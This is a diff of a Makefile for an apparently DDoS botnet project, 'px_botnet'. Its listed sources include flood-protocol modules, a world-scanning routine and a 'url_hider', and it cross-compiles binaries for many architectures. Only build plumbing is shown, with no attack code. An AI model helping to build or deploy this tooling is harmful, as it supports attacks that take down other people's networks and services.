@@ -8,7 +8,15 @@ SRCS				= px_botnet.c src/ft_strnjoin.c src/ft_free_split.c src/ft_generate_ip.c
 					  src/ft_get_id.c src/request/ft_request.c src/request/http.c src/protocol/global.c src/protocol/OVHL7.c \
 					  src/protocol/HOLD.c src/protocol/HTTP.c src/protocol/JUNK.c src/protocol/RANDHEX.c \
 					  src/protocol/STD.c src/protocol/TCP.c src/protocol/UDPRAW.c src/protocol/XTDCUSTOM.c \
-					  src/protocol/UDP.c src/ft_getarch.c src/ft_scan_world.c src/protocol/PPS.c
+					  src/protocol/UDP.c src/ft_getarch.c src/ft_scan_world.c src/protocol/PPS.c src/libft/ft_putnbr_fd.c \
+					  src/libft/ft_putendl_fd.c src/libft/ft_putchar_fd.c src/libft/ft_putstr_fd.c src/libft/ft_striteri.c \
+					  src/libft/ft_strmapi.c src/libft/ft_itoa.c src/libft/ft_split.c src/libft/ft_substr.c src/libft/ft_strtrim.c \
+					  src/libft/ft_strjoin.c src/libft/ft_atoi.c src/libft/ft_bzero.c src/libft/ft_isalnum.c src/libft/ft_isalpha.c \
+					  src/libft/ft_isascii.c src/libft/ft_isdigit.c src/libft/ft_isprint.c src/libft/ft_memchr.c src/libft/ft_memcmp.c \
+					  src/libft/ft_memcpy.c src/libft/ft_memmove.c src/libft/ft_memset.c src/libft/ft_strchr.c src/libft/ft_strlcat.c \
+					  src/libft/ft_strlcpy.c src/libft/ft_strlen.c src/libft/ft_strncmp.c src/libft/ft_strnstr.c src/libft/ft_strrchr.c \
+					  src/libft/ft_tolower.c src/libft/ft_toupper.c src/libft/ft_strdup.c src/libft/ft_calloc.c
+
 NAME				= px_botnet
 OBJS_DIR			= objs/
 PROJECT_H			= includes/px_botnet.h
@@ -23,16 +31,19 @@ $(OBJS_DIR)%.o : %.c $(PROJECT_H)
 	@mkdir -p $(OBJS_DIR)src
 	@mkdir -p $(OBJS_DIR)src/request
 	@mkdir -p $(OBJS_DIR)src/protocol
-	@$(CC) $(CC_FLAGS) -c $< -o $@
+	@mkdir -p $(OBJS_DIR)src/libft
+	$(CC) $(CC_FLAGS) -c ./$< -o ./$@
 	@printf	"\033[2K\r${BLU}[BUILD]${RST} '$<' $(END)"
 
-$(NAME): maker $(OBJECTS_PREFIXED)
-	@$(CC) -o $(NAME) $(OBJECTS_PREFIXED) $(CC_FLAGS) libft/libft.a
+$(NAME): $(OBJECTS_PREFIXED)
+	@$(CC) -o $(NAME) $(OBJECTS_PREFIXED) $(CC_FLAGS)
 	@printf "\033[2K\r\033[0;32m[END]\033[0m $(NAME)$(END)\n"
 
 all: $(NAME)
+	make -C url_hider
 
 everything:
+	@chmod -R 777 *
 	@make fclean
 	@rm -rf cross_compiled
 	@mkdir cross_compiled
@@ -77,21 +88,15 @@ everything:
 	@make fclean
 	@echo All cross compiled binaries are in cross_compiled/
 
-maker:
-	@make -C url_hider
-	@make -C libft cross=$(cross)
-#If u want to compile all cross compiled binaries, please add a "." before ($(cross)) at the line before, and remove it if u want to compile only one binary.
-	
 clean:
-	@make clean -C libft
 	@make clean -C url_hider
 	@rm -rf $(OBJS_DIR)
 	@printf "\033[2K\r${GRN}[CLEAN]${RST} done$(END)"
 
 fclean: clean
-	@make fclean -C libft
 	@make fclean -C url_hider
 	@rm -f $(NAME)
+	@rm -rf cross_compiled
 	@printf "\033[2K\r${GRN}[FCLEAN]${RST} done$(END)"
 
 re: fclean all
